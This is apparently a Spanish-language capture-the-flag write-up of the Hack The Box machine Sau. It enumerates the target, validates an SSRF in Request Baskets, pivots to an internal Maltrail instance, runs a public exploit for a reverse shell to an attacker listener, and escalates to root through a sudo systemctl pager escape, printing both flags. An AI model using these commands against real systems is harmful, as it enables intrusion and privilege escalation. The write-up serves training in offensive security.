# SAU — Hack The Box

## 1. Introducción del caso

Sau es una máquina de Hack The Box que, pese a presentar una superficie expuesta aparentemente pequeña, obliga a trabajar con bastante disciplina metodológica. El caso arranca con una enumeración muy contenida, pero pronto enseña una lección importante: cuando un servicio web expuesto ofrece una huella concreta, conviene interpretarla bien antes de abrir ramas de trabajo innecesarias.

La resolución real del caso se apoya en una cadena técnica muy clara:

1. identificación de la superficie dominante;
2. reconocimiento del producto y de su versión;
3. validación de una SSRF sobre Request Baskets;
4. pivote hacia un servicio interno accesible solo desde localhost;
5. explotación del servicio interno para obtener una shell como `puma`;
6. escalada local de privilegios hasta `root` mediante el comportamiento de `systemctl` en combinación con una configuración permisiva en `sudo`.

Desde un punto de vista formativo, Sau es especialmente útil para estudiar cuatro patrones reutilizables:

- cómo interpretar una web en puerto alto con respuestas HTTP poco convencionales;
- cómo pasar de una candidata pública plausible a una validación real del flujo vulnerable;
- cómo usar una SSRF no solo para confirmar vulnerabilidad, sino para descubrir servicios internos relevantes;
- cómo distinguir entre acceso inicial y escalada local, manteniendo la lectura cronológica del caso.

---

## 2. Preparación y arranque del laboratorio

### 2.1. Función de `Inici-HTB`

La resolución se inicia con la utilidad `Inici-HTB`, utilizada como herramienta de arranque del caso. Su papel no es “resolver” la máquina, sino dejar preparado el entorno de trabajo y generar una primera base de evidencias técnicas.

En la práctica, este script realiza varias tareas útiles para estandarizar el inicio del laboratorio:

- fija el objetivo en el entorno visual del atacante;
- prepara el directorio base de trabajo;
- valida la conectividad inicial;
- intenta una identificación temprana del sistema operativo;
- lanza un escaneo completo de puertos TCP;
- realiza un reconocimiento de servicios y versiones;
- deja los resultados guardados en archivos de trabajo para consulta posterior;
- genera un resumen inicial con la superficie dominante y el siguiente paso sugerido.

La ventaja didáctica de este arranque es clara: permite comenzar con una fase 1 ordenada y repetible, en lugar de depender de un inicio improvisado en cada máquina.

### 2.2. Arranque real del caso

```bash
❯ Inici-HTB SAU 10.129.32.133
[*] Fijando objetivo en Polybar con settarget
[*] Preparando directorio base
[*] Comprobando conectividad inicial
PING 10.129.32.133 (10.129.32.133) 56(84) bytes of data.
64 bytes from 10.129.32.133: icmp_seq=1 ttl=63 time=48.4 ms

--- 10.129.32.133 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 48.402/48.402/48.402/0.000 ms
[*] Intentando identificación rápida con whichSystem.py

10.129.32.133 (ttl -> 63): Linux
```

### 2.3. Qué enseña esta fase

El `ping` no se usa aquí como una simple formalidad. Permite validar que el objetivo está vivo y accesible antes de invertir tiempo en un escaneo completo. Además, el valor de `ttl=63` sugiere un entorno Linux, aunque esa señal por sí sola nunca debe tratarse como prueba fuerte.

La salida de `whichSystem.py` refuerza esa hipótesis inicial, pero en este punto lo correcto es hablar de **estimación preliminar**, no de certeza. La confirmación fuerte vendrá después con los banners de servicio.

---

## 3. Enumeración inicial de red y servicios

### 3.1. Escaneo completo de puertos

Una vez validada la conectividad, se procede al escaneo completo de puertos TCP. Este paso es importante porque evita que la enumeración se limite a los puertos más comunes y obliga a identificar cualquier superficie inusual.

```bash
[*] Lanzando escaneo completo de puertos
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-22 16:02 CEST
Initiating SYN Stealth Scan at 16:02
Scanning 10.129.32.133 [65535 ports]
Discovered open port 22/tcp on 10.129.32.133
Discovered open port 55555/tcp on 10.129.32.133
Completed SYN Stealth Scan at 16:02, 12.27s elapsed (65535 total ports)

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
55555/tcp open  unknown syn-ack ttl 63
```

### 3.2. Lectura inicial del resultado

La primera conclusión útil de esta salida es que la superficie expuesta no es amplia. Solo aparecen dos puertos abiertos:

- `22/tcp`, claramente asociado a SSH;
- `55555/tcp`, un puerto alto no estándar que responde, pero todavía sin clasificación clara.

Esta observación ya condiciona la estrategia. Cuando una máquina expone muy pocos servicios, conviene profundizar mucho en cada uno de ellos antes de abrir ramas paralelas. En Sau, esto resulta decisivo, porque el puerto alto será mucho más importante que SSH durante la fase inicial.

### 3.3. Fingerprinting de servicios

Después del escaneo completo, se ejecuta el reconocimiento de servicios y versiones. Este paso es esencial porque permite pasar de la mera presencia de puertos a una caracterización útil de la superficie expuesta.

```bash
[*] Lanzando escaneo de servicios
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-22 16:02 CEST

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
55555/tcp open  unknown
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GetRequest:
|     HTTP/1.0 302 Found
|     Location: /web
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
```

### 3.4. Interpretación del fingerprint

Este bloque de salida tiene mucho valor y conviene leerlo con calma.

#### Confirmación del sistema operativo

El banner de `OpenSSH 8.2p1 Ubuntu 4ubuntu0.7` aporta una evidencia mucho más fuerte que el TTL inicial. A partir de aquí, la hipótesis de Linux deja de ser una mera sospecha y pasa a estar sólidamente respaldada por un banner de servicio real.

#### Identificación de la superficie dominante

Aunque `22/tcp` está abierto, en este momento no existe ningún usuario, credencial ni clave reutilizable que convierta SSH en una vía de entrada inmediata.

En cambio, `55555/tcp` devuelve señales muy concretas:

- responde como HTTP;
- redirige a `/web`;
- acepta `GET` y `OPTIONS`;
- devuelve un mensaje muy característico sobre un `basket name` inválido.

Esta combinación convierte la web en la superficie dominante de la fase 1.

#### Señal clave: `invalid basket name`

La cadena `invalid basket name; the name does not match pattern...` no es un error genérico cualquiera. Es una huella muy útil porque apunta a una lógica de aplicación concreta, no a un simple servidor HTTP sin contexto.

En términos metodológicos, esto enseña una lección importante: **cuando una respuesta de error tiene semántica propia del producto, puede valer más que una página bonita o un banner clásico**.

---

## 4. Cierre razonado de la fase 1

### 4.1. Qué quedó validado

Al cerrar la fase inicial, ya se dispone de una base bastante clara:

- el objetivo está vivo y accesible;
- el sistema parece Linux con fuerte respaldo en banners de servicio;
- hay dos puertos abiertos;
- SSH existe, pero sin valor operativo todavía;
- la web en `55555/tcp` es la superficie dominante;
- el comportamiento HTTP observado apunta a una aplicación específica aún no confirmada del todo.

### 4.2. Conclusión operativa de la fase

La fase 1 puede darse por suficientemente cerrada porque no falta información crítica para elegir una rama principal. La decisión correcta en este punto no es insistir en SSH ni empezar a probar técnicas aleatorias, sino continuar con la enumeración web.

### 4.3. Rama principal y ramas secundarias

- **Rama principal:** `WEB-BASE`
- **Rama secundaria 1:** `SSH`, anotada pero sin credenciales
- **Rama secundaria 2:** posible `SSRF / localhost / servicio interno`, solo como hipótesis débil en este momento

Esta separación es importante. La hipótesis de servicio interno todavía no domina el caso, pero queda anotada porque varias pistas del comportamiento HTTP sugieren que la aplicación podría tener más lógica de la que aparenta en un primer vistazo.

---

## 5. Inspección adicional de la superficie web

### 5.1. Comandos utilizados

Para caracterizar la aplicación web, se utilizan los siguientes comandos:

```bash
curl -i http://10.129.32.133:55555/
curl -i http://10.129.32.133:55555/web
curl -s http://10.129.32.133:55555/web | head -n 80
whatweb http://10.129.32.133:55555
curl -s http://10.129.32.133:55555/web | grep -Ei 'version|powered|login|api|basket'
```

### 5.2. Por qué estos comandos tenían sentido

Esta batería de comandos cumple funciones complementarias:

- `curl -i` permite revisar cabeceras HTTP y redirecciones;
- `curl -s ... | head` sirve para inspeccionar rápidamente el HTML inicial sin depender del navegador;
- `whatweb` ayuda a detectar tecnologías visibles;
- `grep` permite extraer cadenas de alto valor semántico como versión, nombre de producto, rutas API o referencias a autenticación.

El objetivo en esta fase no es todavía explotar nada, sino **identificar el producto real y su contexto técnico**.

### 5.3. Lo que se confirmó

La inspección adicional permitió validar varios puntos decisivos:

- el servicio es **Request Baskets**;
- la instancia expone **versión 1.2.1** en el pie de página;
- existe una interfaz funcional en `/web`;
- aparece un enlace administrativo a `/web/baskets`;
- la lógica cliente usa `sessionStorage` para un `master_token`;
- las llamadas JavaScript usan rutas API bajo `/api/baskets/<nombre>`;
- la propia interfaz indica que el servicio funciona en **restricted mode**.

### 5.4. Qué cambia después de este hallazgo

Este punto marca un cambio claro de calidad en la enumeración. La web deja de ser una “superficie interesante” y pasa a ser una **aplicación concretamente identificada**, con:

- nombre de producto;
- versión;
- rutas API visibles;
- mecanismo de autorización observable;
- candidata pública plausible.

---

## 6. De la enumeración a la hipótesis explotable

### 6.1. Candidata principal

Con el producto y la versión ya identificados, la candidata pública que mejor encaja es **CVE-2023-27163**, una SSRF que afecta a Request Baskets hasta la versión 1.2.1.

Esta hipótesis no aparece por intuición, sino por la convergencia de varias señales:

- la versión observada es `1.2.1`;
- la aplicación expone `/api/baskets/{name}`;
- el producto trabaja con lógica de reenvío de peticiones;
- la propia semántica del servicio encaja con el patrón de la vulnerabilidad descrita públicamente.

### 6.2. Qué seguía pendiente de verificar

Pese a que la candidata encaja muy bien, todavía faltaban dos comprobaciones críticas:

1. si el flujo vulnerable era realmente alcanzable en esta instancia concreta;
2. si el modo restringido y el uso de `master_token` bloqueaban por completo la aplicabilidad del vector.

Esta distinción es importante. Una CVE plausible no equivale automáticamente a una explotación validada.

### 6.3. Lección reutilizable

En esta fase aparece un patrón muy valioso para casos futuros:

> **primero se identifica el producto; después se valida su versión; luego se comprueba si la candidata pública encaja con el comportamiento real; y solo entonces se intenta demostrar el flujo vulnerable.**

Este orden reduce muchísimo el ruido y evita probar PoCs por simple parecido superficial.

---

## 7. Verificación del comportamiento de autorización

### 7.1. Peticiones utilizadas

Para comprobar el comportamiento real de autorización alrededor de la aplicación, se ejecutan varias peticiones directas:

```bash
curl -i http://10.129.32.133:55555/web/baskets
curl -i http://10.129.32.133:55555/api/baskets
curl -i -X OPTIONS http://10.129.32.133:55555/api/baskets/test
curl -s http://10.129.32.133:55555/web | grep -Ei 'restricted|token|api/baskets|Version'
```

### 7.2. Qué se buscaba exactamente

Estas peticiones no se lanzan al azar. Se usan para responder preguntas muy concretas:

- ¿existe diferencia entre interfaz visible y API operativa?
- ¿la API devuelve `401 Unauthorized` sin token?
- ¿qué métodos HTTP parecen permitidos?
- ¿hasta qué punto el `master_token` es un requisito real y no solo una etiqueta del frontend?

### 7.3. Lectura del resultado

La evidencia confirmó que:

- la administración era visible desde la web;
- la API requería autorización por token en ciertos flujos;
- el modelo de acceso no era el de un login clásico, sino el de un control operativo por token y por contexto.

En este punto la rama de trabajo se acerca a `WEB-AUTH / PANEL`, pero con un matiz importante: el caso no gira en torno a usuario/contraseña ni a un perfil tradicional, sino a la **aplicabilidad real de una SSRF en una aplicación con control parcial por token**.

---

## 8. Flujo manual con la aplicación: creación de una basket

### 8.1. Acceso al frontal principal

Se accede a la interfaz principal de Request Baskets en:

```text
http://10.129.32.133:55555/web
```

La interfaz permite crear una nueva basket y devuelve un token asociado a ella.

### 8.2. Evidencias visuales del flujo

- **Imagen 1:** acceso al frontal principal y formulario de creación.
- **Imagen 2:** creación de la basket y emisión del token.
- **Imagen 3:** apertura de la basket creada.
- **Imagen 4:** respuesta obtenida al consultar la basket.
- **Imagen 5:** resultado de `feroxbuster` sobre la aplicación.

### 8.3. Qué enseña este paso

La interacción manual con la aplicación aporta algo que el simple `curl` no ofrece: confirma un **flujo funcional real**. Esto permite validar que la instancia no es meramente informativa, sino que acepta creación de baskets y devuelve identificadores utilizables.

El flujo observado fue:

1. creación de la basket;
2. devolución de un token asociado;
3. obtención de una URL específica para la basket;
4. consulta de esa basket para ver cómo responde el sistema.

### 8.4. Fuzzing contextual

También se ejecuta `feroxbuster` contra el frontal:

```bash
feroxbuster -u http://10.129.32.133:55555 -C 400,404
```

La intención aquí no es redescubrir toda la aplicación, sino confirmar si existen rutas de interés adicionales sin el ruido de respuestas `400` y `404`.

El resultado útil del fuzzing es más contextual que revolucionario: no abre una segunda gran rama, pero sí ayuda a consolidar el entendimiento del frontal expuesto y de las rutas visibles.

---

## 9. Validación de la SSRF en Request Baskets

### 9.1. Motivo del siguiente paso

Como las señales ya apuntaban con fuerza a **CVE-2023-27163**, el siguiente movimiento lógico era dejar de hablar de plausibilidad y pasar a una validación real del flujo.

Para ello se utiliza una prueba de concepto pública sobre Request Baskets.

### 9.2. Qué se quería demostrar

La validación no buscaba todavía una shell. Lo primero era demostrar que la aplicación podía:

- aceptar una URL de reenvío controlada;
- provocar desde la víctima una solicitud HTTP hacia una dirección elegida por el atacante;
- comportarse como pivote hacia otros destinos, potencialmente internos.

### 9.3. Listener para validar el callback

Se levanta un listener en el puerto 80 del atacante:

```bash
❯ sudo nc -lvp 80
listening on [any] 80 ...
```

Este paso tiene un objetivo muy concreto: comprobar si la víctima puede alcanzar la IP del atacante a través del flujo de reenvío.

### 9.4. Resultado observado

Tras configurar el reenvío hacia la IP del atacante y lanzar la solicitud, se recibe lo siguiente:

```bash
10.129.32.133: inverse host lookup failed: Unknown host
connect to [10.10.15.26] from (UNKNOWN) [10.129.32.133] 45084
GET / HTTP/1.1
Host: 10.10.15.26
User-Agent: curl/7.88.1
Accept: */*
X-Do-Not-Forward: 1
Accept-Encoding: gzip
```

### 9.5. Interpretación

Este fragmento es el punto de inflexión real del caso. Aquí ya no se está ante una candidata plausible, sino ante una SSRF validada empíricamente.

La víctima establece una conexión HTTP hacia la IP del atacante, lo que demuestra que:

- la lógica de reenvío funciona;
- la aplicación puede usarse para originar peticiones desde el contexto de la víctima;
- el flujo vulnerable es aplicable en esta instancia.

La cabecera `X-Do-Not-Forward: 1` es especialmente interesante porque sugiere una protección contra bucles de reenvío, algo coherente con una aplicación diseñada para redirigir peticiones.

### 9.6. Lección reutilizable

Cuando una SSRF está en duda, una validación con callback HTTP al atacante es una forma excelente de pasar de la teoría a la evidencia directa.

---

## 10. Pivote a localhost y descubrimiento del servicio interno

### 10.1. Por qué este giro tenía sentido

El escaneo inicial ya había mostrado que el puerto 80 estaba filtrado desde el exterior. Una vez validada la SSRF, el siguiente paso natural era comprobar qué existía en ese `127.0.0.1:80` que la red externa no podía ver directamente.

Aquí aparece uno de los patrones más interesantes de Sau: **la SSRF no se utiliza únicamente para confirmar vulnerabilidad, sino para romper la frontera entre superficie externa y superficie interna**.

### 10.2. Reconfiguración del proxy basket

La basket se reconfigura para reenviar a:

```text
http://127.0.0.1:80
```

Además, se activan dos opciones clave:

- **Proxy Response**, para que la basket devuelva al cliente la respuesta del servicio interno;
- **Expand Forward Path**, para que la ruta solicitada se extienda correctamente en el reenvío.

### 10.3. Resultado del pivote

Al acceder a la URL de la basket ya configurada, la respuesta expone una instancia interna de **Maltrail v0.53**.

Este hallazgo es decisivo por varias razones:

- confirma que el puerto 80 filtrado externamente sí aloja un servicio relevante;
- demuestra que la SSRF permite pivotar hacia localhost;
- identifica un nuevo producto y una nueva versión;
- abre una nueva candidata pública de alto valor.

### 10.4. Qué cambia después

A partir de aquí, la cadena del caso deja de girar alrededor de Request Baskets como objetivo final y pasa a entenderse como un pivote:

**Request Baskets → SSRF → servicio interno localhost → Maltrail v0.53**

Esto es importante a nivel editorial y técnico. La aplicación expuesta no era el destino final de la explotación, sino la puerta de entrada hacia el servicio verdaderamente interesante.

---

## 11. Explotación de Maltrail y acceso inicial

### 11.1. Preparación del exploit

Una vez identificada la instancia interna de Maltrail, se descarga una prueba de concepto pública desde Exploit Database:

```bash
curl -s https://www.exploit-db.com/download/51676 > exploit.py
```

Este paso tiene sentido porque, a diferencia de la fase anterior, ahora ya existe un producto interno concreto, una versión visible y una referencia pública suficientemente plausible para justificar la validación práctica.

### 11.2. Preparación del listener de shell

Antes de ejecutar el exploit, se deja preparado un listener en el puerto 4444 del atacante:

```bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
```

La razón es simple: si el exploit funciona, el callback debe tener un destino listo para recibir la conexión.

### 11.3. Ejecución de la prueba de concepto

```bash
❯ python3 exploit.py 10.10.15.26 4444 http://10.129.32.133:55555/v2jmfit
Running exploit on http://10.129.32.133:55555/v2jmfit/login
```

### 11.4. Resultado: shell como `puma`

Se recibe la conexión inversa:

```bash
connect to [10.10.15.26] from (UNKNOWN) [10.129.32.133] 56330
$ id
uid=1001(puma) gid=1001(puma) groups=1001(puma)
```

Después se comprueba el contexto del sistema:

```bash
$ uname -a
Linux sau 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
$ whoami
puma
```

### 11.5. Estabilización de la shell

La shell inicial se estabiliza con:

```bash
$ script /dev/null -c bash
$ export TERM=xterm
$ stty -raw echo; fg
```

No todo el proceso de estabilización resulta perfecto —aparece un `bash: fg: current: no such job`—, pero el acceso queda suficientemente usable para continuar con la enumeración local.

### 11.6. Lectura del punto de acceso

Este punto marca el cierre del acceso inicial. La cadena web ha funcionado y el resultado es una shell como `puma`, un usuario con privilegios limitados.

La lección aquí es clara: la explotación del caso no se resuelve “saltando a root” desde una CVE web, sino encadenando varias capas:

- enumeración web correcta;
- validación de SSRF;
- pivote a localhost;
- identificación de Maltrail;
- obtención de acceso inicial.

---

## 12. Obtención de la flag de usuario

Desde la shell de `puma` se revisa el directorio personal:

```bash
puma@sau:~$ ls -la
...
-rw-r----- 1 root puma   33 Apr 22 13:48 user.txt
```

Y posteriormente se lee la flag:

```bash
puma@sau:~$ cat user.txt
29f28444308be0b9b6392eca072bff99
```

Esta salida confirma dos cosas:

1. el acceso inicial es real y no una ejecución aislada sin contexto;
2. la fase de obtención de `user` queda cerrada.

---

## 13. Enumeración local orientada a privilegios

### 13.1. Revisión de privilegios sudo

El primer paso útil tras obtener una shell limitada consiste en revisar permisos `sudo`:

```bash
puma@sau:~$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

### 13.2. Por qué este hallazgo es importante

La salida de `sudo -l` es uno de los puntos más valiosos de toda la enumeración local. No se limita a decir “puede usar sudo”, sino que define exactamente qué comando puede ejecutar `puma` como root y sin contraseña.

En este caso, la posibilidad de ejecutar:

```text
/usr/bin/systemctl status trail.service
```

abre una vía muy prometedora porque `systemctl status` suele paginar su salida con `less`, y ese comportamiento puede volverse peligroso si la configuración lo permite.

### 13.3. Verificación de la versión de systemd

También se consulta la versión de `systemd`:

```bash
puma@sau:~$ systemctl --version
systemd 245 (245.4-4ubuntu3.22)
```

La revisión pública de esta versión y del comportamiento del paginador en combinación con `sudo` sugiere una vía viable de escalada local en este entorno.

### 13.4. Interpretación didáctica

Aquí el punto importante no es obsesionarse con una etiqueta CVE aislada, sino comprender el patrón:

- un usuario limitado puede ejecutar `systemctl status` como root;
- `systemctl status` invoca un paginador en determinadas condiciones;
- si el paginador no está suficientemente restringido, puede permitir la ejecución de comandos externos;
- si esa ejecución ocurre en el contexto de root, la shell resultante hereda esos privilegios.

Esa lectura es mucho más útil que memorizar un identificador sin entender la mecánica real del fallo.

---

## 14. Escalada local con `systemctl`

### 14.1. Ejecución del comando permitido

```bash
puma@sau:~$ sudo /usr/bin/systemctl status trail.service
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>)
     Active: active (running) since Wed 2026-04-22 13:47:06 UTC; 4h 22min ago
     ...
     └─1435 pager
```

### 14.2. Qué interesa de esta salida

El objetivo de este comando no es leer el estado del servicio por curiosidad. Lo importante es que la salida paginada confirma que se está usando un **pager**. Ese detalle es la clave de la escalada.

### 14.3. Escape desde `less`

Dentro del paginador se introduce:

```bash
!/bin/bash
```

Y se obtiene:

```bash
root@sau:/home/puma#
```

### 14.4. Por qué funciona

El comportamiento descrito se apoya en que el paginador permite ejecutar comandos externos. Como `systemctl status trail.service` se ejecuta con privilegios de root mediante `sudo`, el comando lanzado desde el paginador hereda ese contexto privilegiado.

Desde el punto de vista didáctico, este es el patrón importante:

- **comando permitido por sudo**
- **salida paginada**
- **escape desde el paginador**
- **shell con privilegios del proceso invocador**

No es una técnica universal, pero sí un patrón muy reutilizable cuando aparecen binarios permitidos por `sudo` que delegan parte de su interacción en utilidades como `less`.

---

## 15. Obtención de root y cierre técnico

### 15.1. Verificación del contexto privilegiado

Una vez obtenida la shell como root, se accede al directorio `/root`:

```bash
root@sau:~# ls -la
...
-rw-r-----  1 root root   33 Apr 22 13:48 root.txt
```

Y se lee la flag final:

```bash
root@sau:~# cat root.txt
f43ff0b8aa59e0508b77fe43cf54ba60
```

### 15.2. Cadena final del caso

La resolución completa del caso puede resumirse así:

1. enumeración inicial con dos puertos relevantes;
2. identificación de Request Baskets en `55555/tcp`;
3. reconocimiento de la versión 1.2.1 y validación de la SSRF;
4. pivote a `127.0.0.1:80` mediante la basket configurada como proxy;
5. descubrimiento de Maltrail v0.53;
6. explotación de Maltrail para obtener una shell como `puma`;
7. revisión de privilegios `sudo`;
8. uso de `systemctl status trail.service` como root;
9. escape del paginador `less` con `!/bin/bash`;
10. obtención de root y lectura de la flag final.

---

## 16. Lecciones reutilizables

### 16.1. No subestimar un puerto alto que responde como HTTP

Un puerto alto aparentemente “desconocido” puede ser mucho más importante que un servicio clásico como SSH. Lo que manda es la calidad del comportamiento observado, no la familiaridad del puerto.

### 16.2. Las respuestas de error pueden identificar el producto

La cadena `invalid basket name` fue una señal muy útil. Los errores bien interpretados pueden revelar más sobre una aplicación que una interfaz superficial.

### 16.3. Una CVE plausible no basta

Antes de dar una candidata por válida, conviene demostrar el flujo real. En Sau, la SSRF quedó confirmada cuando la víctima generó una conexión HTTP hacia el atacante.

### 16.4. La SSRF puede ser un pivote, no solo un fin

La aplicación vulnerable no era el objetivo definitivo, sino el medio para alcanzar un servicio interno filtrado desde el exterior.

### 16.5. Enumeración local: `sudo -l` sigue siendo un básico imprescindible

Una shell limitada no sirve de mucho si no se entiende qué puede ejecutar el usuario. `sudo -l` volvió a ser aquí el paso decisivo para localizar la escalada real.

### 16.6. Leer el patrón importa más que memorizar la etiqueta

Más útil que recordar un identificador concreto es entender el mecanismo: un binario permitido por `sudo`, una salida paginada y un escape del paginador pueden bastar para obtener root.

---

## 17. Resumen técnico final

Sau se resuelve mediante una cadena coherente y bien escalonada. La superficie externa parece reducida, pero el análisis cuidadoso del servicio web expuesto en `55555/tcp` permite identificar Request Baskets 1.2.1 y validar una SSRF funcional. Esa SSRF sirve como pivote hacia un servicio interno en localhost, donde aparece una instancia vulnerable de Maltrail. La explotación de Maltrail proporciona acceso inicial como `puma`, y la escalada final se consigue gracias a una combinación de `sudo` permisivo y escape desde el paginador usado por `systemctl`.

La resolución real del laboratorio enseña que el progreso no vino de una sola gran técnica, sino de **encadenar correctamente observación, validación, pivote y escalada local**.

---

## 18. Anexo — notas originales conservadas

> Nota editorial: no se ha dispuesto de un Markdown bruto independiente; por petición expresa, el presente anexo conserva la transcripción base reconstruida a partir del PDF final como si ese PDF hubiese sido el material fuente equivalente a unas notas de trabajo.

### 18.1. Transcripción base del contenido fuente

#### Síntesis

Sau es una máquina centrada en la enumeración y análisis de servicios web expuestos, con especial atención a la identificación de vectores que permiten ampliar el alcance inicial del reconocimiento. El escenario obliga a correlacionar indicios obtenidos durante la fase de enumeración, validar hipótesis sobre la superficie de ataque y encadenar una vulnerabilidad de acceso inicial con una posterior escalada local de privilegios en Linux. En términos formativos, resulta una máquina muy útil para reforzar metodología, lectura técnica de evidencias y explotación progresiva de un entorno aparentemente simple, pero con varios elementos clave ocultos tras una exposición reducida.

#### Preparación inicial con Inici-HTB

Inici-HTB crea el entorno de trabajo de la máquina con su estructura básica de carpetas y notas, ejecuta el escaneo inicial completo de puertos con nmap y el reconocimiento de servicios y versiones con nmap -sCV, y deja todos los resultados guardados en ficheros para su consulta posterior. Además, genera un resumen inicial del objetivo con el sistema estimado, los servicios detectados, la superficie dominante sugerida, las ramas secundarias y el siguiente paso recomendado.

#### Resultados iniciales de Inici-HTB

```bash
❯ Inici-HTB SAU 10.129.32.133
[*] Fijando objetivo en Polybar con settarget
[*] Preparando directorio base
[*] Comprobando conectividad inicial
PING 10.129.32.133 (10.129.32.133) 56(84) bytes of data.
64 bytes from 10.129.32.133: icmp_seq=1 ttl=63 time=48.4 ms

--- 10.129.32.133 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 48.402/48.402/48.402/0.000 ms
[*] Intentando identificación rápida con whichSystem.py

10.129.32.133 (ttl -> 63): Linux

[*] Lanzando escaneo completo de puertos
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-22 16:02 CEST
Initiating SYN Stealth Scan at 16:02
Scanning 10.129.32.133 [65535 ports]
Discovered open port 22/tcp on 10.129.32.133
Discovered open port 55555/tcp on 10.129.32.133
Completed SYN Stealth Scan at 16:02, 12.27s elapsed (65535 total ports)

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
55555/tcp open  unknown syn-ack ttl 63
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-22 16:02 CEST

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
55555/tcp open  unknown
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GetRequest:
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
```

#### Conclusiones de la fase 1

La fase 1 puede darse por suficientemente cerrada. Se dispone de conectividad validada, puertos identificados, fingerprint de servicios y una superficie dominante bastante clara.

La máquina presenta indicios sólidos de ser Linux. Esta estimación no se apoya únicamente en el TTL: el elemento de mayor peso es el banner de OpenSSH sobre Ubuntu en 22/tcp. La salida de whichSystem.py y el ttl=63 refuerzan la hipótesis, pero el banner SSH ofrece una evidencia más fuerte.

La superficie dominante no es SSH, sino la web expuesta en 55555/tcp. Aunque SSH está abierto, por el momento no existen credenciales ni indicios de acceso consolidable por esa vía. En cambio, el puerto 55555 ya muestra comportamiento HTTP real, una redirección clara a /web y un mensaje de error muy característico.

El servicio expuesto en 55555/tcp presenta una huella bastante concreta. La combinación de 302 -> /web con el mensaje invalid basket name apunta con bastante fuerza a request-baskets. Aun así, la versión exacta sigue pendiente de verificación directa en esta instancia.

Por ahora no existe base suficiente para activar la rama WEB-AUTH / PANEL. En la evidencia observada no aparecen login, token, forgot-password, perfil, CMS ni credenciales. En consecuencia, la rama correcta en este momento es WEB-BASE.

SSH debe mantenerse como rama secundaria, no como principal. Su presencia es relevante, pero mientras no exista un usuario o una credencial reutilizable, no domina todavía el caso.

También conviene anotar una señal lateral de interés. Dos puertos aparecen como filtrados y varias publicaciones sobre Sau describen servicios internos relevantes detrás del frontal web. Por ello, resulta razonable dejar registrada como secundaria la posibilidad de servicio interno / SSRF / localhost, aunque por ahora solo como hipótesis y no como ruta activa.

#### Inspección adicional de la superficie web

```bash
curl -i http://10.129.32.133:55555/
curl -i http://10.129.32.133:55555/web
curl -s http://10.129.32.133:55555/web | head -n 80
whatweb http://10.129.32.133:55555
curl -s http://10.129.32.133:55555/web | grep -Ei 'version|powered|login|api|basket'
```

#### Hallazgos verificados

La evidencia observada confirma ya de forma directa que el servicio en 55555/tcp es Request Baskets y que la instancia expone versión 1.2.1 en el propio HTML del pie de página. La interfaz muestra una aplicación web funcional en /web, con enlace de administración a /web/baskets, uso de sessionStorage para master_token y llamadas JavaScript a la API bajo la ruta /api/baskets/<nombre>. La propia página indica que el servicio está en restricted mode y que el master token es necesario para crear una nueva basket desde esa interfaz. Con esta evidencia, ya no se está ante una web genérica: ya existe producto, versión, ruta API y mecanismo de autorización visible.

#### Hipótesis de trabajo

Inferencia razonable: la fase puramente genérica de WEB-BASE ya ha cumplido su función principal: identificar con claridad el tipo de aplicación y su versionado. Inferencia razonable: la candidata pública más fuerte en este momento es CVE-2023-27163, una SSRF en Request Baskets hasta la versión 1.2.1 a través del componente /api/baskets/{name}. La candidata encaja bien porque la versión observada es 1.2.1, el endpoint /api/baskets/... aparece en el propio código cliente y el proyecto soporta el reenvío de peticiones a URLs arbitrarias. Pendiente de verificar: si en esta instancia concreta el flujo vulnerable es realmente alcanzable sin disponer de un master_token, o si el modo restringido impone una condición previa que cambie la aplicabilidad práctica de la candidata. La presencia de la vulnerabilidad pública no demuestra por sí sola explotabilidad inmediata en este despliegue. Pendiente de verificar: si el valor real del caso está en un servicio interno HTTP detrás de esta aplicación, algo coherente con una SSRF pero todavía no demostrado por tu evidencia actual.

#### Criterio de análisis

Se ha aplicado primero el criterio del sub-roadmap WEB-BASE: identificar tecnología, rutas, producto y versión antes de cambiar de rama. Dado que ahora ya existen producto, versión, endpoint y señal de control de acceso, también procede activar el flujo operativo posterior a fase 1 y versionado para valorar candidatas públicas sin saltar a explotación operativa. No se da todavía el salto a receta ofensiva; solo se prioriza una candidata plausible y se define una verificación corta única.

#### Interpretación del caso

La lectura del caso mejora bastante con esta nueva evidencia.

